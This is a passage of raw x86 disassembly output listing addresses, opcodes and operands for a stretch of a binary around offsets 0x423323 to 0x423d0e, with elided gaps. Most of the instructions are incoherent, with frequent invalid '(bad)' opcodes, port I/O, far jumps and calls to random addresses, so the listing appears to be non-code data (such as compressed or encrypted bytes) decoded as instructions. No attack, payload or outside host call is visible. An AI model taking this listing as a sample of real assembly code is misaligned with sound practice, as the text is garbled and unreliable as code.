  423323:	mov    bl,0x97
  423325:	xor    ah,BYTE PTR [edx+0x76]
  423328:	add    DWORD PTR [eax],eax
  42332a:	pop    es
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    ah,ah
  42332f:	xor    eax,0xbae738e3
  423334:	mov    cl,0x70
  423336:	dec    ebp
  423337:	inc    ebx
  423338:	add    al,0x23
  42333a:	dec    ecx
  42333b:	imul   edx,DWORD PTR [esi+0x24],0xffffffdd
  42333f:	nop
  423340:	in     eax,0x86
  423342:	sub    edi,eax
  423344:	fwait
  423345:	pop    es
  423346:	data16 or bl,al
  423349:	and    al,0x2b
  42334b:	xchg   ah,cl
  42334d:	jno    0x4232e9
  42334f:	and    BYTE PTR [eax+eiz*2],ch
  423352:	aad    0x67
  423354:	mov    edx,0x47ff79c
  423359:	test   al,0x6f
  42335b:	mov    bh,0x22
  42335d:	pop    ebx
  42335e:	adc    DWORD PTR [esi-0x28],ecx
  423361:	pop    edx
  423362:	outs   dx,BYTE PTR ds:[esi]
  423363:	inc    esi
  423364:	adc    esi,DWORD PTR [ebp-0x5d]
  423367:	out    0x25,al
  423369:	lock fld TBYTE PTR [edi-0x4a]
  42336d:	and    DWORD PTR [esi-0x14],ecx
  423370:	dec    ebx
  423371:	call   0xa568e0fe
  423376:	into   
  423377:	pop    eax
  423378:	ds mov dh,0x3d
  42337b:	dec    eax
  42337c:	cmp    BYTE PTR [ebx],bl
  42337e:	or     DWORD PTR [edi+edi*8],edi
  423381:	jp     0x4233bf
  423383:	data16 add al,0xdd
  423386:	xchg   esp,eax
  423387:	aam    0x26
  423389:	lock cdq 
  42338b:	(bad)  
  42338c:	jecxz  0x4233bc
  42338e:	xlat   BYTE PTR ds:[ebx]
  42338f:	pop    esp
  423390:	sub    edi,DWORD PTR [ecx+0x4f]
  423393:	fcmovnb st,st(4)
  423395:	imul   ebp,ebp,0xffffff9a
  423398:	add    DWORD PTR [ebx-0x7e],edx
  42339b:	jecxz  0x4233ff
  42339d:	push   0x5d3ad465
  4233a2:	pop    es
  4233a3:	xchg   ebx,eax
  4233a4:	fisttp QWORD PTR gs:[edi]
  4233a7:	hlt    
  4233a8:	adc    eax,0x8eab281b
  4233ad:	push   esp
  4233ae:	mov    bh,0x5c
  4233b0:	outs   dx,BYTE PTR ds:[esi]
  4233b1:	jle    0x4233e0
  4233b3:	cmp    al,BYTE PTR [edi]
  4233b5:	and    esp,DWORD PTR [edi]
  4233b7:	xchg   BYTE PTR [ecx-0x56],bh
  4233ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233bb:	rcl    DWORD PTR [esi-0x33],cl
  4233be:	test   eax,0x31680a6d
  4233c3:	sub    eax,0x65fa6286
  4233c8:	fstp   QWORD PTR [ebx]
  4233ca:	inc    ecx
  4233cb:	push   cs
  4233cc:	call   0xee0dceb0
  4233d1:	rcl    DWORD PTR [ecx-0x157c1677],cl
  4233d7:	daa    
  4233d8:	and    DWORD PTR [ebx+0x57],ebx
  4233db:	sbb    al,0x3f
  4233dd:	jno    0x423389
  4233df:	shrd   DWORD PTR [eax],esp,cl
  4233e2:	add    esp,DWORD PTR [ebx+0x45]
  4233e5:	add    eax,0x1cffa12e
  4233ea:	sbb    eax,0x633027dc
  4233ef:	pop    es
  4233f0:	jle    0x423379
  4233f2:	adc    ebp,DWORD PTR [edi+ecx*8-0x34198008]
  4233f9:	push   ss
  4233fa:	sbb    ah,BYTE PTR [ecx+0x2929d1db]
  423400:	outs   dx,DWORD PTR ds:[esi]
  423401:	push   ss
  423402:	sbb    al,0x0
  423404:	call   0xbe594b65
  423409:	paddusb mm5,mm3
  42340c:	xchg   edx,eax
  42340d:	aad    0x72
  42340f:	jne    0x423391
  423411:	add    cl,BYTE PTR [edx-0x11]
  423414:	popf   
  423415:	and    al,0x19
  423417:	pop    edx
  423418:	mov    esi,0xfab10801
  42341d:	sub    bl,dh
  42341f:	test   eax,0x536391e0
  423424:	push   ebp
  423425:	(bad)  
  423426:	fidivr WORD PTR [edi+0x18]
  423429:	dec    esp
  42342a:	outs   dx,BYTE PTR ds:[esi]
  42342b:	imul   esp,esp,0xfffffff9
  42342e:	dec    esi
  42342f:	mov    esi,0x40566579
  423434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  423495:	add    al,al
  423497:	mov    al,0x45
  423499:	outs   dx,DWORD PTR ds:[esi]
  42349a:	jne    0x42349b
  42349c:	jmp    0xade0:0x16fb60bf
  4234a3:	xor    BYTE PTR [esi+0x17769e4],ah
  4234a9:	add    BYTE PTR [edi],al
  4234ab:	add    DWORD PTR [eax],eax
  4234ad:	add    dl,ah
  4234af:	jb     0x42347c
  4234b1:	(bad)  
  4234b2:	int3   
  4234b3:	in     eax,0x14
  4234b5:	cmp    cl,BYTE PTR ds:0x1a84c623
  4234bb:	retf   
  4234bc:	xor    edi,esp
  4234be:	adc    al,0x12
  4234c0:	popf   
  4234c1:	push   ebx
  4234c2:	jmp    0xb022b32e
  4234c7:	sub    DWORD PTR [edx+0x72],ebp
  4234ca:	imul   esi,DWORD PTR [eax+0x5356708c],0xffffff92
  4234d1:	cld    
  4234d2:	mov    ebp,0x9aec05e7
  4234d7:	mov    DWORD PTR [eax+0x1f],ebx
  4234da:	lds    ebx,FWORD PTR [ebp-0x12]
  4234dd:	mov    ch,0x1c
  4234df:	mov    edx,0xdd036ebd
  4234e4:	test   eax,0xa04cd218
  4234e9:	fld    DWORD PTR [eax+0x53]
  4234ec:	xlat   BYTE PTR ds:[ebx]
  4234ed:	fidivr DWORD PTR [ecx]
  4234ef:	cmp    dh,cl
  4234f1:	inc    ecx
  4234f2:	outs   dx,DWORD PTR ds:[esi]
  4234f3:	ds retf 
  4234f5:	retf   0x2437
  4234f8:	mov    ecx,ebx
  4234fa:	cwde   
  4234fb:	std    
  4234fc:	test   al,0x4f
  4234fe:	xor    al,0x21
  423500:	in     al,0x1d
  423502:	push   edx
  423503:	mov    cl,0xb1
  423505:	mov    BYTE PTR [edi-0x6887beaf],dh
  42350b:	je     0x423582
  42350d:	sbb    DWORD PTR ds:0xc4f88cf3,esp
  423513:	in     eax,0x41
  423515:	mov    bl,0xe4
  423517:	xor    cl,bh
  423519:	mov    eax,0xbe5c9fb5
  42351e:	jno    0x4234e9
  423520:	mov    edi,0xfeb4818c
  423525:	imul   DWORD PTR [edx+0x1564690b]
  42352b:	stc    
  42352c:	repz dec esi
  42352e:	sbb    ebp,edx
  423530:	xchg   ebx,eax
  423531:	es ins BYTE PTR es:[edi],dx
  423533:	mov    ds:0xb41c99,eax
  423538:	ins    BYTE PTR es:[edi],dx
  423539:	pop    esi
  42353a:	aaa    
  42353b:	mov    dl,0xae
  42353d:	sbb    cl,BYTE PTR [eax+0x7811e42]
  423543:	pop    esi
  423544:	inc    ebp
  423545:	ficomp WORD PTR [edi+0x43]
  423548:	loop   0x42354c
  42354a:	stc    
  42354b:	test   eax,0x6af6ff73
  423550:	mov    dh,0xef
  423552:	xlat   BYTE PTR ds:[ebx]
  423553:	pop    es
  423554:	mov    dh,0x9a
  423556:	fwait
  423557:	push   ss
  423558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423559:	dec    ebx
  42355a:	retf   
  42355b:	mov    BYTE PTR [edx],ah
  42355d:	int    0x3f
  42355f:	es xor dl,dh
  423562:	ds mov dh,0xff
  423565:	ss fs std 
  423568:	add    edi,esp
  42356a:	jnp    0x423554
  42356c:	fcmove st,st(2)
  42356e:	lds    esp,FWORD PTR [ebx]
  423570:	dec    edx
  423571:	pop    ecx
  423572:	(bad)  
  423574:	fiadd  DWORD PTR [ebx-0x2a7e9f75]
  42357a:	sub    cl,BYTE PTR [edx]
  42357c:	mov    eax,ds:0xdf5f1fd8
  423581:	cmp    BYTE PTR [eax+0x6e1bcfe7],dl
  423587:	test   eax,0x98838330
  42358c:	je     0x423561
  42358e:	into   
  42358f:	xchg   edx,eax
  423590:	jmp    ecx
  423592:	mov    eax,ds:0x49fb2c4a
  423597:	dec    esi
  423598:	pop    bx
  42359a:	scas   al,BYTE PTR es:[edi]
  42359b:	sub    eax,0x9045de57
  4235a0:	xor    eax,0xa44d3c79
  4235a5:	in     al,dx
  4235a6:	imul   ebp,DWORD PTR [edi-0x2f162756],0xcd3e7f79
  4235b0:	xor    cl,cl
  4235b2:	sub    al,0x3d
  4235b4:	push   cs
	...
  423615:	add    BYTE PTR [eax+0x7f747c8f],al
  42361b:	test   DWORD PTR [eax+0x6a2d48ff],0xcb1644da
  423625:	lea    esi,[eax+0x78]
  423628:	add    DWORD PTR [eax],eax
  42362a:	pop    es
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    BYTE PTR [ebp-0x3862d9a3],dh
  423633:	popa   
  423634:	dec    eax
  423635:	jo     0x4235c3
  423637:	out    dx,al
  423638:	retf   0x29f0
  42363b:	push   es
  42363c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42363d:	das    
  42363e:	mov    dl,0x76
  423640:	or     bh,BYTE PTR [eax]
  423642:	lahf   
  423643:	or     eax,0xd33c54c9
  423648:	nop
  423649:	adc    ecx,eax
  42364b:	(bad)  
  42364c:	mov    bh,0x80
  42364e:	xchg   esi,eax
  42364f:	(bad)  
  423650:	xchg   edi,eax
  423651:	xor    al,0xf3
  423653:	ins    BYTE PTR es:[edi],dx
  423654:	adc    bl,dl
  423656:	lds    edi,FWORD PTR [ebp+0x5b]
  423659:	fnop   
  42365b:	aad    0x93
  42365d:	mov    ds:0x6b1bba17,al
  423662:	js     0x42364b
  423664:	ret    0xe9d8
  423667:	out    dx,al
  423668:	push   esp
  423669:	lock es pop edx
  42366c:	jnp    0x4236de
  42366e:	sub    ebp,ebx
  423670:	daa    
  423671:	pop    edx
  423672:	lods   eax,DWORD PTR ds:[esi]
  423673:	jg     0x423638
  423675:	neg    bh
  423677:	jbe    0x4235fe
  423679:	or     eax,0xae8d2214
  42367e:	jmp    0x26f56216
  423683:	rcr    BYTE PTR [ecx-0x5d52bdfb],1
  423689:	popa   
  42368a:	sub    eax,0x9ee73481
  42368f:	sbb    edi,edx
  423691:	pushf  
  423692:	inc    esi
  423693:	and    ecx,DWORD PTR [ebx+0x3aa7bdb0]
  423699:	push   ds
  42369a:	pop    edi
  42369b:	imul   edx,edx,0x14
  42369e:	test   BYTE PTR [edx+0x2c8deaa5],bh
  4236a4:	mov    esi,DWORD PTR [eax-0x6f]
  4236a7:	inc    ebx
  4236a8:	stos   BYTE PTR es:[edi],al
  4236a9:	mov    cl,0xc8
  4236ab:	mov    BYTE PTR [ebp-0x4b],dh
  4236ae:	(bad)  
  4236af:	fcom   st(0)
  4236b1:	and    eax,esp
  4236b3:	jb     0x42366a
  4236b5:	sbb    al,0x8a
  4236b7:	cmp    ecx,ecx
  4236b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236ba:	adc    edx,DWORD PTR [eax-0x4593f602]
  4236c0:	push   es
  4236c1:	in     eax,dx
  4236c2:	loope  0x42367f
  4236c4:	and    ebp,edx
  4236c6:	add    BYTE PTR [ebp-0x25b86feb],al
  4236cc:	lods   eax,DWORD PTR ds:[esi]
  4236cd:	in     eax,dx
  4236ce:	cdq    
  4236cf:	sbb    DWORD PTR [esi-0x3],0xec5c9ece
  4236d6:	outs   dx,DWORD PTR ds:[esi]
  4236d7:	pop    ss
  4236d8:	in     eax,dx
  4236d9:	jns    0x423754
  4236db:	scas   al,BYTE PTR es:[edi]
  4236dc:	pushf  
  4236dd:	dec    esi
  4236de:	pusha  
  4236df:	dec    ebp
  4236e0:	mov    cs,WORD PTR [edi+0x64]
  4236e3:	mov    cl,0x86
  4236e5:	mov    dl,0xf7
  4236e7:	xor    DWORD PTR [ecx],ebx
  4236e9:	das    
  4236ea:	push   esi
  4236eb:	retf   0x93a6
  4236ee:	jge    0x423765
  4236f0:	(bad)
  4236f4:	in     al,0x44
  4236f6:	jp     0x423715
  4236f8:	rcr    al,cl
  4236fa:	pop    ds
  4236fb:	xor    ah,al
  4236fd:	das    
  4236fe:	mov    bh,0xc9
  423700:	mov    eax,ds:0x2927800b
  423705:	lahf   
  423706:	aas    
  423707:	xchg   edi,eax
  423708:	push   edi
  423709:	bound  esp,QWORD PTR [ecx]
  42370b:	jb     0x4236b3
  42370d:	sub    al,0xbd
  42370f:	pop    edi
  423710:	adc    bh,BYTE PTR [edi]
  423712:	push   ebp
  423713:	add    eax,0xabad2713
  423718:	push   ebx
  423719:	or     bl,bh
  42371b:	mov    ds:0x49d98310,al
  423720:	sahf   
  423721:	fwait
  423722:	xchg   ebp,eax
  423723:	addr16 mov ebp,0xde01790d
  423729:	or     DWORD PTR [eax],ecx
  42372b:	xchg   ebp,eax
  42372c:	js     0x423794
  42372e:	mov    dl,0x12
  423730:	scas   eax,DWORD PTR es:[edi]
  423731:	jp     0x42374b
  423733:	xchg   BYTE PTR [edi],dh
	...
  423795:	add    BYTE PTR [ebx+eiz*1],dh
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0x68002c2e
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    BYTE PTR [ebx],al
  4237af:	xor    DWORD PTR [ecx-0x4d],0xab8bc85e
  4237b6:	xchg   ecx,eax
  4237b7:	dec    ebx
  4237b8:	xchg   ebp,eax
  4237b9:	les    esi,FWORD PTR [edx+0x7d]
  4237bc:	adc    eax,0xb3189302
  4237c1:	dec    edi
  4237c2:	jo     0x42381a
  4237c4:	push   0xffffffe7
  4237c6:	pop    es
  4237c7:	adc    al,BYTE PTR [eax]
  4237c9:	mov    esi,DWORD PTR [eax+ebp*4+0x3276d8ea]
  4237d0:	cmp    edx,DWORD PTR [edi+0x5f002ef3]
  4237d6:	aam    0x8a
  4237d8:	push   edi
  4237d9:	lock or dl,BYTE PTR [ecx]
  4237dc:	nop
  4237dd:	jns    0x4237ca
  4237df:	and    esi,ebp
  4237e1:	adc    eax,0x4a20a785
  4237e6:	push   eax
  4237e7:	fnstenv [esi]
  4237e9:	arpl   WORD PTR [esi+0x40ff9041],bp
  4237ef:	fsub   st,st(2)
  4237f1:	sbb    al,0x56
  4237f3:	jmp    0xba8d1d22
  4237f8:	ret    
  4237f9:	push   0x3f79bde
  4237fe:	or     eax,0x328786e4
  423803:	sahf   
  423804:	sbb    al,0x1c
  423806:	pop    ebp
  423807:	or     DWORD PTR [ecx-0x4f976030],0xffffffc0
  42380e:	pusha  
  42380f:	(bad)  
  423810:	pushf  
  423811:	push   es
  423812:	aam    0xcf
  423814:	jmp    0x5f8e:0xe7069def
  42381b:	jns    0x42388b
  42381d:	cld    
  42381e:	push   0x870ffd9b
  423823:	xchg   DWORD PTR [esi+edx*2],ebx
  423826:	jb     0x4237d1
  423828:	sub    eax,0x3a9348d1
  42382d:	cmp    dl,bh
  42382f:	cwde   
  423830:	test   eax,0x8e9feebd
  423835:	loop   0x423830
  423837:	mov    ch,0x22
  423839:	dec    DWORD PTR [esi-0x7276478d]
  42383f:	adc    al,0xe5
  423841:	sbb    esi,eax
  423843:	inc    ecx
  423845:	mov    ds:0x68801bf8,eax
  42384a:	pop    edi
  42384b:	push   es
  42384c:	scas   eax,DWORD PTR es:[edi]
  42384d:	sbb    bh,BYTE PTR [esi+0xe]
  423850:	sbb    DWORD PTR [eax-0x127812a1],0xffffffbc
  423857:	js     0x42383a
  423859:	pop    edx
  42385a:	(bad)  
  42385b:	out    dx,eax
  42385c:	sub    ecx,0xffffff87
  42385f:	adc    ch,BYTE PTR [ecx+eiz*8+0x5a6d2c9d]
  423866:	ds pop ss
  423868:	inc    esi
  423869:	aaa    
  42386a:	jno    0x4238c8
  42386c:	add    BYTE PTR [edi],ch
  42386e:	idiv   DWORD PTR [edi-0x7f]
  423871:	mov    eax,ds:0xff971371
  423876:	adc    esp,DWORD PTR [edi-0x1a]
  423879:	in     al,0x5a
  42387b:	pushf  
  42387c:	in     al,0x2b
  42387e:	push   ds
  42387f:	inc    ebx
  423880:	in     al,dx
  423881:	or     al,0xa
  423883:	js     0x42383f
  423885:	inc    ebx
  423886:	cmc    
  423887:	icebp  
  423888:	mov    bl,0xa8
  42388a:	stos   DWORD PTR es:[edi],eax
  42388b:	and    DWORD PTR [eax+eiz*8],eax
  42388e:	inc    BYTE PTR [esi-0x685abd7c]
  423894:	mov    edx,0xa354d1b0
  423899:	cmp    dh,BYTE PTR [ecx+0x56]
  42389c:	jl     0x423882
  42389e:	pop    ebx
  42389f:	mov    ecx,0x13102997
  4238a4:	pop    edx
  4238a5:	mov    ah,0x45
  4238a7:	dec    edi
  4238a8:	push   cs
  4238a9:	xor    eax,0x67d39fc3
  4238ae:	jmp    0x3361:0xcf65735a
	...
  423915:	add    BYTE PTR [edx-0x770e5c],cl
  42391b:	(bad)  
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    DWORD PTR [ebx],eax
  423923:	pop    ebx
  423924:	inc    esi
  423925:	stos   DWORD PTR es:[edi],eax
  423926:	jle    0x4239a2
  423928:	add    DWORD PTR [eax],eax
  42392a:	pop    es
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    bl,dl
  42392f:	in     al,0x64
  423931:	es inc eax
  423933:	aaa    
  423934:	and    eax,0xf56dfe60
  423939:	(bad)  
  42393a:	cld    
  42393b:	and    ebx,DWORD PTR [ecx+0x44]
  42393e:	push   0xffffffa6
  423940:	jbe    0x4238eb
  423942:	push   esi
  423943:	clc    
  423944:	push   ebp
  423945:	add    ah,dl
  423947:	adc    al,0xf1
  423949:	int3   
  42394a:	push   0x1ede57e2
  42394f:	push   edx
  423950:	mov    eax,ds:0x9a2fb01c
  423955:	or     ebp,DWORD PTR [ebx-0x27298308]
  42395b:	add    DWORD PTR [eax],esp
  42395d:	ins    BYTE PTR es:[edi],dx
  42395e:	pop    edx
  42395f:	mov    edx,0x23f8f3b1
  423964:	adc    DWORD PTR [esp+ebx*4],ebx
  423967:	mov    ds:0xe4c5e333,eax
  42396c:	and    eax,0x45afcb95
  423971:	or     al,BYTE PTR [ecx+0xf]
  423974:	repz push cs
  423976:	ins    BYTE PTR es:[edi],dx
  423977:	mov    dl,0xf0
  423979:	les    edx,FWORD PTR [edx-0x2f]
  42397c:	jnp    0x42397c
  42397e:	(bad)  
  423980:	cmc    
  423981:	xor    edi,DWORD PTR [ecx]
  423983:	add    eax,0xd436e6
  423988:	loopne 0x42393f
  42398a:	adc    bl,al
  42398c:	or     ch,BYTE PTR [ebp+0x3b10144a]
  423992:	gs pop ebx
  423994:	dec    eax
  423995:	clc    
  423996:	retf   
  423997:	lods   al,BYTE PTR ds:[esi]
  423998:	xor    esi,eax
  42399a:	imul   edx,ebp,0x54
  42399d:	outs   dx,BYTE PTR ds:[esi]
  42399e:	and    ebp,DWORD PTR [ebx+0x3c8c7e16]
  4239a4:	(bad)  
  4239a5:	mov    ds:0x5ad3572,eax
  4239aa:	int    0x28
  4239ac:	push   eax
  4239ad:	adc    BYTE PTR [esi],cl
  4239af:	inc    esp
  4239b0:	jbe    0x4239b2
  4239b2:	ja     0x423a0b
  4239b4:	push   ss
  4239b5:	out    0x10,eax
  4239b7:	dec    esi
  4239b8:	and    edi,0xd8b5d431
  4239be:	into   
  4239bf:	in     al,dx
  4239c0:	stos   DWORD PTR es:[edi],eax
  4239c1:	in     eax,0x38
  4239c3:	mov    BYTE PTR ss:[edi],bl
  4239c6:	ficomp DWORD PTR [edi-0x550c290b]
  4239cc:	dec    eax
  4239cd:	leave  
  4239ce:	ret    0xf0f5
  4239d1:	or     DWORD PTR [edx+0x3e8e0755],0x346e24d5
  4239db:	in     eax,dx
  4239dc:	loope  0x423a40
  4239de:	xlat   BYTE PTR ds:[ebx]
  4239df:	sub    BYTE PTR [eax+ebp*1+0x4e015999],ah
  4239e6:	arpl   si,bp
  4239e8:	in     al,0x31
  4239ea:	mov    dh,0x3d
  4239ec:	and    dh,BYTE PTR [edi+0x444a31b0]
  4239f2:	push   ebp
  4239f3:	sub    DWORD PTR [esi],0x5a79ddfd
  4239f9:	add    al,0xbd
  4239fb:	pop    DWORD PTR [esi-0x5]
  4239fe:	xchg   ecx,eax
  4239ff:	int3   
  423a00:	mov    ah,0xba
  423a02:	das    
  423a03:	or     DWORD PTR [ecx],ebp
  423a05:	cld    
  423a06:	(bad)  
  423a07:	imul   ebp,edi,0xffffffe1
  423a0a:	adc    ebx,esi
  423a0c:	rcr    ebp,cl
  423a0e:	xor    bh,0x7b
  423a11:	iret   
  423a12:	mov    bl,0xdf
  423a14:	mov    dh,0x9b
  423a16:	cmp    ebx,ebp
  423a18:	xor    ebx,DWORD PTR ds:0xd9614237
  423a1e:	(bad)  
  423a1f:	ins    DWORD PTR es:[edi],dx
  423a20:	add    al,0xe5
  423a22:	pop    esp
  423a23:	jno    0x423a1c
  423a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a26:	call   0xcdd4:0xa75e30c0
  423a2d:	lds    eax,FWORD PTR [edi]
  423a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a30:	sbb    al,0xed
  423a32:	retf   
  423a33:	add    eax,0xbb
	...
  423a94:	add    BYTE PTR [eax],al
  423a96:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	ins    DWORD PTR es:[edi],dx
  423aa3:	hlt    
  423aa4:	xlat   BYTE PTR es:[ebx]
  423aa6:	test   DWORD PTR [ebx+0x1],edi
  423aa9:	add    BYTE PTR [edi],al
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    BYTE PTR [edx+esi*1-0x65ea0788],cl
  423ab4:	cmp    BYTE PTR [ecx-0x3b],cl
  423ab7:	lock imul DWORD PTR [ecx-0x32f43928]
  423abe:	mov    ds:0xda5fd6e9,eax
  423ac3:	(bad)  
  423ac4:	(bad)  {k5}
  423ac9:	sub    ch,bl
  423acb:	jne    0x423a5b
  423acd:	or     al,0xea
  423acf:	mov    ah,0x0
  423ad1:	les    esp,FWORD PTR [ecx+ecx*2]
  423ad4:	pop    ecx
  423ad5:	or     al,0x8c
  423ad7:	sti    
  423ad8:	cld    
  423ad9:	and    al,BYTE PTR [ebx+0x43]
  423adc:	pop    edx
  423add:	jns    0x423b2f
  423adf:	jbe    0x423ae3
  423ae1:	ins    DWORD PTR es:[edi],dx
  423ae2:	inc    esp
  423ae3:	cmp    al,0x77
  423ae5:	dec    ecx
  423ae6:	out    0xfd,eax
  423ae8:	dec    eax
  423ae9:	inc    edi
  423aea:	and    ecx,DWORD PTR [edx]
  423aec:	dec    ebx
  423aed:	mov    bl,0x66
  423aef:	mov    ecx,0x79f920a2
  423af4:	jnp    0x423b37
  423af6:	cmp    eax,DWORD PTR [edi-0x9]
  423af9:	xlat   BYTE PTR ds:[ebx]
  423afa:	ja     0x423b62
  423afc:	in     eax,dx
  423afd:	loope  0x423abe
  423aff:	jg     0x423aa2
  423b01:	pop    ecx
  423b02:	lock pop ebx
  423b04:	std    
  423b05:	mov    edi,DWORD PTR ds:0x7e8b4f78
  423b0b:	in     eax,0x58
  423b0d:	enter  0x4c26,0x41
  423b11:	mov    edi,0xca7c85fa
  423b16:	xchg   esi,eax
  423b17:	dec    ebx
  423b18:	pop    esp
  423b19:	jb     0x423b84
  423b1b:	xchg   edx,eax
  423b1c:	pop    edx
  423b1d:	test   eax,0x8c28748e
  423b22:	mov    edi,0x13c5a00e
  423b27:	dec    eax
  423b28:	fsubr  QWORD PTR [edx+edx*2-0x1d]
  423b2c:	xor    BYTE PTR [ebp-0x30060d8e],ch
  423b32:	cli    
  423b33:	xchg   edi,eax
  423b34:	jle    0x423b3f
  423b36:	test   al,0x5f
  423b38:	addr16 push ds
  423b3a:	dec    esp
  423b3b:	adc    al,0xf8
  423b3d:	xor    esi,esi
  423b3f:	xchg   ecx,eax
  423b40:	and    al,0xaf
  423b42:	adc    edx,DWORD PTR ds:0xe244225a
  423b48:	cmp    dh,ch
  423b4a:	and    al,0x65
  423b4c:	mov    ebp,0x460deb54
  423b51:	fbstp  TBYTE PTR [ebx-0x7a46bfbb]
  423b57:	jnp    0x423bbb
  423b59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b5a:	sub    al,0x3f
  423b5c:	push   ds
  423b5d:	lahf   
  423b5e:	sbb    eax,0x8bd283eb
  423b63:	mov    esi,0xb4d7b766
  423b68:	and    eax,0x2fab14e0
  423b6d:	or     eax,0xafadf5e0
  423b72:	push   ecx
  423b73:	icebp  
  423b74:	lock daa 
  423b76:	mov    cl,0x26
  423b78:	lahf   
  423b79:	mul    BYTE PTR [edx+0x2b]
  423b7c:	lahf   
  423b7d:	or     esp,DWORD PTR [esi+0x30ed7052]
  423b83:	cmp    esp,DWORD PTR [ecx-0x65]
  423b86:	call   0x88691c15
  423b8b:	int3   
  423b8c:	inc    ebp
  423b8d:	in     al,dx
  423b8e:	imul   ecx,eax,0xffffff8f
  423b91:	mov    BYTE PTR [ebx+eiz*1],bl
  423b94:	out    dx,al
  423b95:	out    dx,eax
  423b96:	mov    eax,ds:0xb4749e42
  423b9b:	outs   dx,DWORD PTR ds:[esi]
  423b9c:	sub    eax,0xef80cab2
  423ba1:	fs data16 jg 0x423bd2
  423ba5:	test   DWORD PTR [esi],ebp
  423ba7:	(bad)  
  423ba8:	syscall 
  423baa:	data16 (bad) [edx+edi*4]
  423bae:	in     eax,0xbc
  423bb0:	clc    
  423bb1:	and    al,BYTE PTR [eax-0x71]
  423bb4:	mov    bh,0x0
	...
  423c16:	std    
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	mov    edi,DWORD PTR [ebp+0x7c8cddf6]
  423c28:	add    DWORD PTR [eax],eax
  423c2a:	pop    es
  423c2b:	add    DWORD PTR [eax],eax
  423c2d:	add    BYTE PTR [eax-0x37],ch
  423c30:	cwde   
  423c31:	dec    ebx
  423c32:	xor    eax,0xa01ae112
  423c37:	das    
  423c38:	adc    eax,0xaf630021
  423c3d:	inc    ebx
  423c3e:	jno    0x423bcb
  423c40:	cs mov bl,0x7e
  423c43:	jecxz  0x423c86
  423c45:	xchg   BYTE PTR [ebp-0x32],al
  423c48:	cmp    BYTE PTR [eax],ch
  423c4a:	or     BYTE PTR [ebp+0x21],0x24
  423c4e:	mov    al,0xca
  423c50:	leave  
  423c51:	daa    
  423c52:	xor    DWORD PTR [eax+0x2b70695d],0xfffffffe
  423c59:	pop    ebx
  423c5a:	dec    BYTE PTR [edx+0x29b8b176]
  423c60:	cmp    dl,al
  423c62:	fisubr DWORD PTR [ebx+0x5944e0b0]
  423c68:	jb     0x423c0c
  423c6a:	jp     0x423c6b
  423c6c:	test   BYTE PTR [eax-0x66],bl
  423c6f:	mov    ds:0x470c2485,eax
  423c74:	mov    esp,0xc2b3007e
  423c79:	cmp    eax,0x31ec6ab9
  423c7e:	and    eax,0x8a3324e3
  423c83:	sysenter 
  423c85:	popf   
  423c86:	push   edi
  423c87:	add    esp,DWORD PTR [ebp+0x1b]
  423c8a:	test   BYTE PTR [ecx-0x1f2010fe],0x74
  423c91:	mov    ebx,0xa91016ad
  423c96:	stos   DWORD PTR es:[edi],eax
  423c97:	fsub   QWORD PTR [edi-0x33c36c7f]
  423c9d:	add    ecx,DWORD PTR [ebx+0x375bf163]
  423ca3:	into   
  423ca4:	push   es
  423ca5:	pop    ecx
  423ca6:	xlat   BYTE PTR ds:[ebx]
  423ca7:	out    0xa7,al
  423ca9:	aam    0x99
  423cab:	xor    esi,DWORD PTR [edx-0x2f]
  423cae:	retf   
  423caf:	sub    al,0x90
  423cb1:	popf   
  423cb2:	fcom   st(2)
  423cb4:	sahf   
  423cb5:	or     ebp,DWORD PTR [esi+0x7f]
  423cb8:	not    edx
  423cba:	and    DWORD PTR [ebx],ebp
  423cbc:	jl     0x423cce
  423cbe:	sbb    ebp,DWORD PTR [ebp-0x39]
  423cc1:	sti    
  423cc2:	jbe    0x423ce1
  423cc4:	fcom   DWORD PTR [ebp+0x319fec69]
  423cca:	int    0x23
  423ccc:	xor    eax,DWORD PTR ss:[ebx+0x621849c8]
  423cd3:	or     cl,al
  423cd5:	je     0x423c60
  423cd7:	jecxz  0x423ca5
  423cd9:	(bad)  
  423cda:	js     0x423d56
  423cdc:	inc    esi
  423cdd:	push   0xffffffc1
  423cdf:	inc    esi
  423ce0:	pushf  
  423ce1:	fs call ebx
  423ce4:	cmp    BYTE PTR [eax+0x5ed78e0e],dh
  423cea:	out    dx,eax
  423ceb:	fistp  QWORD PTR [edi]
  423ced:	push   edx
  423cee:	pop    esp
  423cef:	in     al,dx
  423cf0:	jge    0x423d28
  423cf2:	xchg   ebp,eax
  423cf3:	repz sub eax,0x5a6b41cb
  423cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cfa:	cld    
  423cfb:	xor    edi,DWORD PTR [eax]
  423cfd:	xchg   edi,eax
  423cfe:	loopne 0x423cd9
  423d00:	and    ah,bl
  423d02:	push   ebp
  423d03:	pop    es
  423d04:	or     esi,ecx
  423d06:	ins    BYTE PTR es:[edi],dx
  423d07:	fcomp  QWORD PTR [esi]
  423d09:	adc    DWORD PTR [ebp-0x58],ecx
  423d0c:	mov    bh,0x43
  423d0e:	add    edx,edx
